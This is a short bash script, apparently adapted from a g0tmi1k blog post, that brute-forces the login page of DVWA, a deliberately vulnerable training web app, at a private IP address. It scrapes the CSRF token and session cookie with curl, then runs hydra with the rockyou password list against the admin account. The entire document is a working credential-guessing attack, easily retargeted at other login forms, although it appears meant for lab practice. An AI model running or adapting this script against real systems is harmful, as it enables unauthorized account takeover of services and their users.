#!/bin/bash
# This is a modified version of the script found here: https://blog.g0tmi1k.com/dvwa/login/
echo 'Starting bruteforcing...'
ATTACKIP=192.168.1.211
ATTACKPORT=8080
CSRF=$(curl -s -c dvwa.cookie "${ATTACKIP}:${ATTACKPORT}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')

echo "Attacking host: ${ATTACKIP} on port: ${ATTACKPORT}"
echo "Using CSRF Token of: ${CSRF} for session ID: ${SESSIONID}"

hydra -s ${ATTACKPORT} -l admin -P /usr/share/wordlists/rockyou.txt ${ATTACKIP} http-post-form "/login.php:username=^USER^&password=^PASS^&user_token=${CSRF}&Login=Login:S=Location\: index.php:C=fake_cookie:H=Cookie: PHPSESSID=${SESSIONID} security=medium;" -v -f